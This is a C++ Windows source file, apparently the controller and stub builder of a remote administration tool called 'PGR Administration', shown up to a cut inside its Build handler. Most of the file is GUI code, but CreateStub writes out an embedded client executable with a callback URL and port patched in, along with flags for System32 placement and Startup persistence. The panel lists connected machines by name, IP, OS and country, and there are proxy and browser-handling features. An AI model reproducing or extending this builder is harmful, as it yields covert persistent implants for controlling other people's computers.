// Server.cpp : Defines the entry point for the application.
//



#include "Initialization.h"
#include "Server.h"
#include "SysTray.h"
#include "Shlwapi.h"
#include <Windowsx.h>
#include <Uxtheme.h>
#include "R_Proxy.h"
#include "Browser_Handler.h"

#define FileSize  6043136
//#define FileSize	317440
#pragma comment(lib, "Shlwapi.lib")
//#pragma comment(lib, "UxTheme.lib")
#define MAX_LOADSTRING 100

// Global Variables:
                                // current instance
//WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name


Packet_Handler* _Handle = new Packet_Handler();
Remote_Handler* _rHandle = new Remote_Handler();
Initialization *Init = new Initialization();
R_Proxy *RP = new R_Proxy();
Browser_Handler *BH = new Browser_Handler();



//Garbage *gBage = new Garbage;
HMODULE hMod = GetModuleHandle(NULL);
HRSRC rSource = FindResource(hMod, MAKEINTRESOURCE(IDF_FONT), RT_FONT);
DWORD Count;
HGLOBAL Address = LoadResource(hMod, rSource);
PVOID FontData = LockResource(Address);
HANDLE fHand = AddFontMemResourceEx(FontData, SizeofResource(hMod, rSource), 0, &Count);


// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
int CreateListColumns(HWND, Packet_Handler*);
LRESULT NotifyHandler(HWND, UINT, WPARAM, LPARAM, Packet_Handler*);
void DrawItemStatic(HWND, LPDRAWITEMSTRUCT, COLORREF, HANDLE);
void DrawItemListView();
LRESULT CALLBACK StubCreationProc(HWND, UINT, WPARAM, LPARAM);

void ReadWriteMain();
int ReadEOF();
BOOL FULL = FALSE;
BOOL HISTORY = FALSE;
BOOL HOVER = FALSE;
BOOL HHOVER = FALSE;
BOOL pLVBG = FALSE;
BOOL CLIENTISACTIVE = FALSE;
BOOL WasListen = FALSE;

HWND pButton = NULL;
HWND sButton = NULL;
HWND sTitle = NULL;
HWND startButton = NULL;
HWND stopButton = NULL;
HWND tButton = NULL;
HWND bButton = NULL;
HWND bBar = NULL;
HWND Spacer = NULL;
HWND hPort = NULL;
HWND hURL = NULL;
HWND ePort = NULL;
HWND eURL = NULL;
HWND hCreate = NULL;
HWND hApply = NULL;
HWND cSys32 = NULL;
HWND cStart = NULL;
HWND hVer = NULL;
HWND hEXIT = NULL;
HWND hMINI = NULL;
HWND hSplash = NULL;
HWND BBG = NULL;
HWND cMini = NULL;
HWND eSName = NULL;
HWND hSName = NULL;
HWND hName = NULL;
HWND hIP = NULL;
HWND hOS = NULL;
HWND hCountry = NULL;
HWND bTitle = NULL;
HWND bCancel = NULL;
HWND sIP = NULL;
HWND sPort = NULL;
HWND sApply = NULL;
HWND sePort = NULL;
HWND seIP = NULL;

HANDLE hFontTa = NULL;
HANDLE hFontSm = NULL;
HANDLE hFontSe = NULL;
HANDLE hFont = NULL;
HANDLE hFontSb = NULL;

HINSTANCE hinstance;

int		CreateStub(BOOL);
struct SETTINGS
{
	int port;
	char URL[256];
	int Sys32;
	int Startup;
};

struct Garbage {
	char FilePath[MAX_PATH];
	char LastURL[MAX_PATH];
	int LastPORT;
	int CLEAR;
}gBage;

int CreateStub(BOOL RAM, wchar_t* stubName)
{


	HRSRC hrsrc = NULL;
	HGLOBAL hGlbl = NULL;
	BYTE *pExeResource = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	//DWORD dwSize = 8192;
	wchar_t wCdir[MAX_PATH +1];
	GetCurrentDirectory(MAX_PATH, wCdir);

	std::wstringstream wss;
	std::wstring wstr;

	

	wss << wCdir << L"\\" << stubName;
	wstr = wss.str();
	//if(RAM)
		hrsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_CLIENTRAM), RT_RCDATA);
	//else
	//	hrsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_CLIENT), RT_RCDATA);
	if (hrsrc == NULL)
		return 0;
	unsigned int dwSize = SizeofResource(NULL, hrsrc);

	hGlbl = LoadResource(NULL, hrsrc);
	if (hGlbl == NULL)
		return 0;
	
	pExeResource = (BYTE*)LockResource(hGlbl);
	std::ofstream stub(wstr.c_str(),std::ios::out| std::ios::binary);
	stub.write((char*)pExeResource, dwSize);
	stub.seekp(dwSize - 0xAEB);
	stub.write((char*)&Init->data, sizeof(SETTINGS));

	/*
	
	char * encrypted = Init->data.URL;
	std::stringstream ss;
	ss << Init->data.URL;
	std::string str;
	str = ss.str();
	
	int i = 2;
	int l = str.length();
	for(i)
	*/



	
	
	stub.close();
	return 1;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.
	
    // Initialize global strings
   // LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_SERVER, szWindowClass, MAX_LOADSTRING);
	
	
    MyRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }



    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SERVER));

    MSG msg;

    // Main message loop:
    //while (GetMessage(&msg, nullptr, 0, 0))
    //{
    //    if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
    //    {
    //        TranslateMessage(&msg);
    //        DispatchMessage(&msg);
    //    }
    //}
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!IsDialogMessage(_Handle->mhWnd, &msg))
		{
			if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
				    {
				        TranslateMessage(&msg);
				        DispatchMessage(&msg);
				    }
		}
	}
    return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//

ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;
	hinstance = hInstance;
    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(MAINICON));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));// (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName = L"PGR Administration";
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
//	return RegisterClassExW(&_rHandle->RemoteClass);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   _Handle->hInst = hInstance; // Store instance handle in our global variable
   RECT rect;
   GetClientRect(GetDesktopWindow(), &rect);
  /* WNDCLASSEXW wcex;

   wcex.cbSize = sizeof(WNDCLASSEX);

   wcex.style = CS_HREDRAW | CS_VREDRAW;
   wcex.lpfnWndProc = WndProc;
   wcex.cbClsExtra = 0;
   wcex.cbWndExtra = 0;
   wcex.hInstance = hInstance;
   wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SPLASH));
   wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
   wcex.hbrBackground = (HBRUSH)COLOR_WINDOW + 1;
   wcex.lpszMenuName = L"SplashScreen";
   wcex.lpszClassName = L"Splash";
   wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
   RegisterClassExW(&wcex);

  

   //(rect.right / 2) - 200, (rect.bottom / 2) - 200
//	hSplash = CreateWindowEx(WS_EX_TOOLWINDOW | WS_EX_LAYERED, L"Splash", L"", WS_POPUP, (rect.right / 2) - 200, (rect.right / 2) - 200, 400, 400, NULL, nullptr, _Handle->hInst, nullptr);


   HBITMAP hBmp = (HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SPLASH), IMAGE_BITMAP, 400, 400, LR_DEFAULTCOLOR);

   POINT pLocat = { rect.left + (rect.right - rect.left - 400) / 2, rect.top + (rect.bottom - rect.top - 400) / 2 };
   POINT pSrc = { 0,0 };


   SIZE sSplash = { 400, 400 };
   HDC hdcScreen = GetDC(NULL);
   HDC hdcMem = CreateCompatibleDC(hdcScreen);
   SelectObject(hdcMem, hBmp);
   
   BLENDFUNCTION blend = { 0 };
   blend.BlendOp = AC_SRC_OVER;
   blend.SourceConstantAlpha = 255;
   blend.AlphaFormat = AC_SRC_ALPHA;
   

   UpdateLayeredWindow(hSplash, hdcScreen, &pLocat, &sSplash, hdcMem, &pSrc, 0, &blend, ULW_OPAQUE);
   ShowWindow(hSplash, nCmdShow);

   Sleep(1250);
   ShowWindow(hSplash, SW_HIDE);
   */
  // OutputDebugString(L"LVOWNER: Request for -1 item?\n");
  // DebugBreak();
   HWND hWnd = CreateWindowW(szWindowClass, L"PGR Administration", NULL, rect.left + (rect.right - rect.left - 400) / 2,
	   rect.top + (rect.bottom - rect.top - 400) / 2, 800, 350, nullptr, nullptr, hInstance, nullptr);
   _Handle->mhWnd = hWnd;

   if (!hWnd)
   {
      return FALSE;
   }
   SetWindowLong(hWnd, GWL_STYLE, WS_BORDER);
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//

LRESULT CALLBACK ButtonProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData)
{

	switch (message)
	{
	case WM_SETCURSOR:
	{
		SetCursor(LoadCursor(NULL, IDC_HAND));





		//if (hCreate == (HWND)wParam && hCreate != NULL)
		//{
		//	if (!HHOVER)
		//	{
		//		HHOVER = TRUE;
		//		RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_VALIDATE);
		//	}
		//	break;

		//}
		if (!HOVER)
		{
			HOVER = TRUE;
			RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_VALIDATE);
			TRACKMOUSEEVENT tm;
			ZeroMemory(&tm, sizeof(TRACKMOUSEEVENT));
			tm.cbSize = sizeof(TRACKMOUSEEVENT);
			tm.dwFlags = TME_LEAVE;
			tm.hwndTrack = hWnd;
			TrackMouseEvent(&tm);

		}return TRUE;
	}
		break;
	case WM_MOUSELEAVE:
		//if (hWnd == hCreate)
		//{
		//	HHOVER = FALSE;
		//	RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_VALIDATE);
		//	break;
		//}
		HOVER = FALSE;
		RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_VALIDATE);
		//MessageBox(NULL, L"MOUSE LEFT!", NULL, NULL);
		break;
	case WM_DESTROY:
	{
		RemoveWindowSubclass(hWnd, ButtonProc, uIdSubclass);
		break;
	}
	}

	return DefSubclassProc(hWnd, message, wParam, lParam);

}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	BOOL Already = FALSE;

	BOOL isChecked;
	HANDLE rwhWnd;
	std::wstringstream wss;
	std::wstring wStr;
	//static HWND hWndListView;
	BOOL eC = TRUE;

	switch (message)
	{


	case WM_CREATE:
	{
		//if (hSplash == NULL )
		//	break;



		
		




		startButton = CreateWindow(L"BUTTON",
			L"Start",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
			10, 55, 30, 15,
			hWnd,
			(HMENU)IDM_START,
			NULL, NULL);
		stopButton = CreateWindow(L"BUTTON",
			L"Stop",
			WS_CHILD | BS_OWNERDRAW,
			10, 55, 30, 15,
			hWnd,
			(HMENU)IDM_STOP,
			NULL, NULL);
		pButton = CreateWindow(L"BUTTON",
			L"Proxy", WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
			685, 51, 28, 16,
			hWnd, (HMENU)IDM_PROXY, NULL, NULL);
		sButton = CreateWindow(L"BUTTON",
			L"Settings",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
			748, 51, 39, 16,
			hWnd,
			(HMENU)IDM_SETTINGS,
			NULL, NULL);
		//tButton = CreateWindow(L"BUTTON",
		//	L"Tools",
		//	WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
		//	686, 51, 29, 16,
		//	hWnd,
		//	(HMENU)IDM_TOOLS, NULL, NULL);
		bButton = CreateWindow(L"BUTTON",
			L"Build",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
			646, 51, 26, 16,
			hWnd,
			(HMENU)IDM_BUILD,
			NULL, NULL);
		
		hEXIT = CreateWindow(L"Button",
			L"",
			WS_VISIBLE |  WS_CHILD | BS_OWNERDRAW,
			778,9, 14, 14,
			hWnd,
			(HMENU)IDM_EXIT,
			NULL, NULL);

		hMINI = CreateWindow(L"BUTTON",
			L"",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,
			759, 10,14, 14,
			hWnd,
			(HMENU)IDM_MINI,
			NULL, NULL);


		SetWindowSubclass(hEXIT, ButtonProc, NULL, NULL);
		SetWindowSubclass(hMINI, ButtonProc, NULL, NULL);
		SetWindowSubclass(startButton, ButtonProc, NULL, NULL);
		SetWindowSubclass(stopButton, ButtonProc, NULL, NULL);
		SetWindowSubclass(sButton, ButtonProc, NULL, NULL);
		SetWindowSubclass(tButton, ButtonProc, NULL, NULL);
		SetWindowSubclass(bButton, ButtonProc, NULL, NULL);
		SetWindowSubclass(pButton, ButtonProc, NULL, NULL);
		//




		sTitle = CreateWindow(L"STATIC",
			L"PGR ADMINISTRATION",
			WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,// | SS_LEFT | WS_EX_TRANSPARENT,
			313, 5, 170, 20,
			hWnd,
			(HMENU)IDM_NAME,
			NULL, NULL);
		hName = CreateWindow(L"BUTTON",
			L"Name",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,// | SS_LEFT | WS_EX_TRANSPARENT,
			44, 77, 31, 16,
			hWnd,
			(HMENU)IDM_NAME,
			NULL, NULL);
		hIP = CreateWindow(L"BUTTON",
			L"IP Address",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,// | SS_LEFT | WS_EX_TRANSPARENT,
			168, 77, 69, 16,
			hWnd,
			(HMENU)IDM_IP,
			NULL, NULL);
		hOS = CreateWindow(L"BUTTON",
			L"Operating System",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,// | SS_LEFT | WS_EX_TRANSPARENT,
			333, 77, 102, 16,
			hWnd,
			(HMENU)IDM_OS,
			NULL, NULL);
		hCountry = CreateWindow(L"BUTTON",
			L"Country",
			WS_VISIBLE | WS_CHILD | BS_OWNERDRAW,// | SS_LEFT | WS_EX_TRANSPARENT,
			537, 77, 49, 16,
			hWnd,
			(HMENU)IDM_COUNTRY,
			NULL, NULL);
		SetWindowSubclass(hName, ButtonProc, NULL, NULL); /////////////////////Need to Subclass for listview
		SetWindowSubclass(hIP, ButtonProc, NULL, NULL);
		SetWindowSubclass(hOS, ButtonProc, NULL, NULL);
		SetWindowSubclass(hCountry, ButtonProc, NULL, NULL);
		//Spacer = CreateWindow(L"STATIC",
		//	L"",
		//	WS_VISIBLE | WS_CHILD | WS_BORDER,
		//	0, 41, 500, 235,
		//	hWnd,
		//	NULL,
		//	NULL, NULL);
		bBar = CreateWindow(L"STATIC", L"", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
			5, 337, 350, 20, hWnd, (HMENU)IDC_BBAR, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		hVer = CreateWindow(L"STATIC", L"Version: 0.06.6 ", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
			720, 337, 350, 20, hWnd, NULL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);

		//hFontB = CreateFont(17, 8, 0, 0, FW_NORMAL, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
		//	DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Demonized");
		hFontTa = CreateFont(0, 0, 0, 0, FW_MEDIUM, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			PROOF_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Tahoma");
		hFontSm = CreateFont(10, 5, 0, 0, FW_NORMAL, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI ");
		hFontSb = CreateFont(14, 0, 0, 0, FW_SEMIBOLD, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			PROOF_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI ");
		hFontSe = CreateFont(14, 0, 0, 0, FW_MEDIUM, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			PROOF_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Segoe UI ");


		CreateListColumns(hWnd, _Handle);
		//CheckMenuItem(GetMenu(hWnd), IDM_HISTORY, MF_CHECKED);
		//CLIENTISACTIVE = TRUE;
		//gBage.CLEAR = FALSE;




		break;
	}
	case WM_DRAWITEM:
	{
		LPDRAWITEMSTRUCT pDIS = (LPDRAWITEMSTRUCT)lParam;

		//if (pDIS->hwndItem == _Handle->hWndList)
		//{
		//	DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);
		//}


		if (pDIS->hwndItem == sTitle)
		{
			SetTextColor(pDIS->hDC, RGB(255,255, 255));
			WCHAR staticText[99];
			int len = SendMessage(sTitle, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);

			SelectObject(pDIS->hDC, hFontTa);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);

		}
		if (pDIS->hwndItem == hEXIT)
		{

			if (!HOVER)
			{
				HDC hdcMem = GetDC(hWnd);
				HPEN hp = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
				SelectObject(hdcMem, hp);
				MoveToEx(hdcMem, 779, 10, 0);
				LineTo(hdcMem, 789, 20);
				MoveToEx(hdcMem, 789, 10, 0);
				LineTo(hdcMem, 779, 20);
			}
			else
			{
				HDC hdcMem = GetDC(hWnd);
				HPEN hp = CreatePen(PS_SOLID, 2, RGB(2, 244, 235));
				SelectObject(hdcMem, hp);
				MoveToEx(hdcMem, 779, 10, 0);
				LineTo(hdcMem, 789, 20);
				MoveToEx(hdcMem, 789, 10, 0);
				LineTo(hdcMem, 779, 20);
			}

		}

		if (pDIS->hwndItem == hMINI)
		{

			if (!HOVER)
			{
				HDC hdcMem = GetDC(hWnd);
				HPEN hp = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
				SelectObject(hdcMem, hp);
				MoveToEx(hdcMem, 759, 20, 0);
				LineTo(hdcMem, 771, 20);
			}
			else
			{
				HDC hdcMem = GetDC(hWnd);
				HPEN hp = CreatePen(PS_SOLID, 2, RGB(2, 244, 235));
				SelectObject(hdcMem, hp);
				MoveToEx(hdcMem, 759, 20, 0);
				LineTo(hdcMem, 771, 20);
			}



		}
		if (pDIS->hwndItem == sButton)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		if (pDIS->hwndItem == hApply)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		if (pDIS->hwndItem == startButton)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);
			//HDC hdcMem = CreateCompatibleDC(pDIS->hDC);
			//HBITMAP hBmp = (HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_START), IMAGE_BITMAP, 15, 15, LR_DEFAULTCOLOR);
			//SelectObject(hdcMem, hBmp);
			////SendMessage(hWnd, BM_SETIMAGE, (WPARAM)IMAGE_BITMAP, (LPARAM)hBmp);
			//StretchBlt(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, pDIS->rcItem.right - pDIS->rcItem.left, pDIS->rcItem.bottom - pDIS->rcItem.top, hdcMem, 0, 0, 15, 15, SRCCOPY);
			//DeleteDC(hdcMem);
			return 0;
		}
		if (pDIS->hwndItem == stopButton)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);
			//HDC hdcMem = CreateCompatibleDC(pDIS->hDC);
			//HBITMAP hBmp = (HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_STOP), IMAGE_BITMAP, 15, 15, LR_DEFAULTCOLOR);
			//SelectObject(hdcMem, hBmp);
			////SendMessage(hWnd, BM_SETIMAGE, (WPARAM)IMAGE_BITMAP, (LPARAM)hBmp);
			//StretchBlt(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, pDIS->rcItem.right - pDIS->rcItem.left, pDIS->rcItem.bottom - pDIS->rcItem.top, hdcMem, 0, 0, 15, 15, SRCCOPY);
			//DeleteDC(hdcMem);
			return 0;
		}
		if (pDIS->hwndItem == tButton)
		{

			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		if (pDIS->hwndItem == bButton)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		if (pDIS->hwndItem == pButton)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		if (pDIS->hwndItem == hName)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSb);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235),hFontSb);

			return 0;
		}
		if (pDIS->hwndItem == hIP)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSb);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSb);

			return 0;
		}
		if (pDIS->hwndItem == hOS)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSb);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSb);

			return 0;
		}
		if (pDIS->hwndItem == hCountry)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSb);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSb);

			return 0;
		}
		if (pDIS->hwndItem == bBar)
		{
			
			WCHAR staticText[99];
			int len = SendMessage(bBar, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);
		//	TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, L" ", 100);
			RECT rect;
			GetClientRect(pDIS->hwndItem, &rect);


			//SelectObject(pDIS->hDC, hFont);
			FillRect(pDIS->hDC, &rect,CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C)));
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			SelectObject(pDIS->hDC, hFontSm);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
			return 0;
		}
		if (pDIS->hwndItem == hVer)
		{
			DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSm);

			return 0;
		}
		if (pDIS->hwndItem == sPort)
		{
			WCHAR staticText[99];
			int len = SendMessage(sPort, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			SelectObject(pDIS->hDC, hFontSm);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
			return 0;
		}
		if (pDIS->hwndItem == sIP)
		{
			WCHAR staticText[99];
			int len = SendMessage(sIP, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			SelectObject(pDIS->hDC, hFontSm);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
			return 0;
		}
	}
	case WM_CTLCOLOREDIT:
	{

		HDC hdcButton = (HDC)wParam;
		SetBkColor(hdcButton, RGB(0x2C, 0x2C, 0x2C));
		SetTextColor(hdcButton, RGB(255, 255, 255));
		SelectObject(hdcButton, hFontSm);
		return (LRESULT)CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));

	}
	case WM_CTLCOLORBTN:
	{
		//HDC hdcButton = (HDC)wParam;
		//SetBkColor(hdcButton, RGB(200, 0, 0));

			HDC hdcButton = (HDC)wParam;
			SetBkColor(hdcButton, RGB(0x2C, 0x2C, 0x2C));
			SetTextColor(hdcButton, RGB(255, 255, 255));

		return (LRESULT)CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));


	}
	break;
	case WM_CTLCOLORSTATIC:
	{

	//	if (lParam == (LPARAM)sTitle || lParam == (LPARAM)bBar || lParam == (LPARAM)hVer)
		//{
			HDC hdcButton = (HDC)wParam;
			SetBkColor(hdcButton, RGB(0x2C, 0x2C, 0x2C));
			SetTextColor(hdcButton, RGB(255, 255, 255));
			SelectObject(hdcButton, hFontSm);
			return (LRESULT)CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));
		//}

	}
	case WM_NCHITTEST:
		UINT uHitTest;

		uHitTest = DefWindowProc(hWnd, WM_NCHITTEST, wParam, lParam);
		if (uHitTest == HTCLIENT)
			return HTCAPTION;
		return uHitTest;
		break;
	case WM_NOTIFY:
		

		return(NotifyHandler(hWnd, message, wParam, lParam, _Handle));
		break;
	case TRAY_NOTIF:
		switch LOWORD(lParam)
		{
		case WM_RBUTTONUP:
			POINT cursor;
			GetCursorPos(&cursor);
			//SetForegroundWindow(hWnd);
			TrackPopupMenu((HMENU)GetSubMenu(LoadMenu(_Handle->hInst, MAKEINTRESOURCE(IDR_TRAYCONTEXT)), 0),
				TPM_LEFTALIGN | TPM_RIGHTBUTTON, cursor.x, cursor.y, 0, hWnd, NULL);
			
			break;
		case WM_LBUTTONUP:
			_Handle->Tray->HideTray(&_Handle->Tray->nID);
		//	Shell_NotifyIcon(NIM_ADD, &Tray->nID);
			ShowWindow(hWnd, SW_SHOW);
			UpdateWindow(hWnd);
			break;

		}
		break; 
    case WM_COMMAND:
        {

            int wmId = LOWORD(wParam);
            // Parse the menu selections:
			switch (wmId)
			{
			case IDM_MINI:
				isChecked = IsDlgButtonChecked(hWnd, IDC_MINI);
				if (isChecked)
				{
					_Handle->Tray->AddTray(LoadIcon(hinstance, MAKEINTRESOURCE(MAINICON)), _Handle->start, &_Handle->Tray->nID, hWnd, _Handle->si.ConnectionCounter);
					//Shell_NotifyIcon(NIM_ADD, &Tray->nID);
					ShowWindow(hWnd, SW_HIDE);
					UpdateWindow(hWnd);
					return 0;
				}
				else
					SendMessage(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, NULL);
				return 0;

				break;
			case IDM_PROXY:
				CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)BH->bHandle, _Handle, NULL, NULL);
				break;
			case IDM_TOOLS:
				break;
			case IDM_BUILD:
			{
				HINSTANCE hInstance = (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE);
				WNDCLASSEXW wcex;
				wcex.cbSize = sizeof(WNDCLASSEXW);
				wcex.hbrBackground = CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));
				wcex.style = CS_HREDRAW | CS_VREDRAW;
				wcex.lpfnWndProc = StubCreationProc;
				wcex.cbClsExtra = 0;
				wcex.cbWndExtra = 0;
				wcex.hInstance = hInstance;
				wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
				wcex.lpszMenuName = L"PGR Administration";
				wcex.lpszClassName = L"StubCreation";
				wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(MAINICON));
